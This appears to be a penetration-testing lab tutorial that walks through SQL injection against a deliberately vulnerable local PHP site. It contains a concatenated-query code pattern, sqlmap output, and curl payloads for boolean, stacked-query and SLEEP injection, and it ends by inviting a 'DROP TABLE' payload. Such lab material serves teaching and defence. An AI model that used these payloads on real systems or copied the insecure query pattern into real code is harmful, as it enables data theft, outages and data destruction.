## PHP SQL Injection

### Background

PHP is a web programming language that is incredibly easy to learn. Unfortunately, this low barrier to entry results in a lot of poorly written code in production.

A very common operation on a website is to take user input and perform some sort of operation on the database with that input. If the user input is not carefuly collected and vetted, the site can be vulnerable to SQL Injection. SQL Injection is a type of attack where an attacker can execute SQL commands by passing unexpected input to the server.

Example:

If you were writing a very basic address book application where you could search the database by your friends' first name. You might write a query like this:

```sql
/* Go into the contacts table and pull out all contacts that match the the provided name */
SELECT * FROM contacts WHERE name = 'name_goes_here';
```

In order to fill in the blank (name_goes_here), you may program your app to accept something like a `GET` request with the `name` parameter. Constructing the query before it gets sent to the database may look like this:

```php
<?php
  $query = "SELECT * FROM contacts WHERE name = '" . $_GET["name"] . "';";
?>
```

If the user types `Bob` in the search box then you will not have a problem -- but what if he or she types in:

```
Bob' OR 1=1;
```

Let's find out.

### Setup

First, we need to use penkit to start our `php-sql-injection` image

```
$ penkit start php-sql-injection
```

Confirm that the container is running.

```
$ penkit ps
```



### Discovery

Now that our image is up and running, let's time some time to investigate how the site works. The first (and easiest) step towards learning more about this site is to visit it in the web browser (`localhost:8080`).

When you visit the site you will see that it has pretty much one function. Type in a number and get an animal. When you search an animal the site will also tell you how many times that animal has previously been searched.

After you type in a number and get your animal, have a look at the url bar:

```
http://localhost:8080/?id=1
```

That `id=1` part is called a `GET` parameter. This is how the web app receives your input.

Now that you have found a way to send data to the website, let's launch sqlmap.

```
$ penkit sqlmap -u localhost:8080
$ docker run --rm -it --net=host penkit/cli:sqlmap -u localhost:8080/?id=1
```

After answering a few prompts, sqlmap will start to perform its tests on that parameter. Eventually, you will get its report.

```
sqlmap identified the following injection point(s) with a total of 275 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1448=1448

    Type: stacked queries
    Title: MySQL > 5.0.11 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1 AND SLEEP(5)
---
```

With this data we now know exactly which types of SQL injection this site is vulnerable to.

### Exploit

Let's tackle them in order.

Let's try that `AND` statement.

```
$ curl http://localhost:8080/?id=1%20AND%201%20=%201
```

SQL translation:

```sql
SELECT * FROM animals WHERE id = 1 AND 1 = 1;
```

As you can see, the server returns "Aardvark" just like it should. What if we try an `OR` statement?

```
$ curl http://localhost:8080/?id=1%20OR%201%20=%201
```

SQL translation:

```sql
SELECT * FROM animals WHERE id = 1 OR 1 = 1;
```

As you can see, the server has dumped its entire list of animals! This works because the database is told "Give me every record from the table `animals` where the `id` is equal to `1` `OR` `1=1`." Since `1=1` is true for every record, the database returns every record that it has.

Now for stacked queries. This is a particularly dangerous type of SQL injection that allows an attacker to execute any command that they would like. Let's issue a request to find out more about the `animals` table.

``
$ curl http://localhost:8080/?id=1%3B+describe+animals%3B
``

SQL translation:

```sql
SELECT * FROM animals WHERE id = 1; DESCRIBE animals;
```

The server now will return information about the `animals` table.

And finally, let's look at this sleep command.

```sql
SELECT * FROM animals WHERE id = 1 AND SLEEP(5)
```

The server may seem like it's doing nothing but it is actually doing is sleeping for 5 seconds! An attacker could easily leverage this attack to render a server useless.


When you're done experimenting, go ahead and give this one a shot:

```sql
1; DROP TABLE animals;
```

And tear down penkit containers.

```
$ penkit rm
```

### Summary

You can mitigate this risk by:

- Ensuring that your SQL queries are sanitized.
- Never allow multiple SQL commands to be executed at once.